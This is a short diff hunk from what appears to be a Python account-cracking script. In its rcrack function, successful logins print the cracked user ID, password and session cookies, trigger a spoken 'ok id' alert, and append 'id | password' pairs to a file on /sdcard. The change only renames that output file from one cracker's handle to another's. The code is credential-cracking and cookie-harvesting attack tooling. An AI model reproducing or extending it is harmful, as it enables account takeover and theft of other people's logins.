@@ -268,7 +268,7 @@ def rcrack(uid,pwx,tl):
                 print('\033[38;5;46m[🦋⃟ᎶꫝᴍᴇᏒ✮⃝ARIYAN𝄟⃝] '+cid+' | '+ps+' \n\033[38;5;46mCOOKIES : \033[1;32m'+coki+   '  ')
                 os.system('espeak -a 300 "Congratulations. ok id"')
                 cek_apk(session,coki)
-                open('/sdcard/\033[38;5;46m🦋⃟ᎶꫝᴍᴇᏒ✮⃝PARVEJ𝄟⃝-OK.txt', 'a').write( cid+' | '+ps+'\n')
+                open('/sdcard/\033[38;5;46m🦋⃟ᎶꫝᴍᴇᏒ✮⃝ARIYAN𝄟⃝-OK.txt', 'a').write( cid+' | '+ps+'\n')
                 oks.append(cid)
                 break
             else:
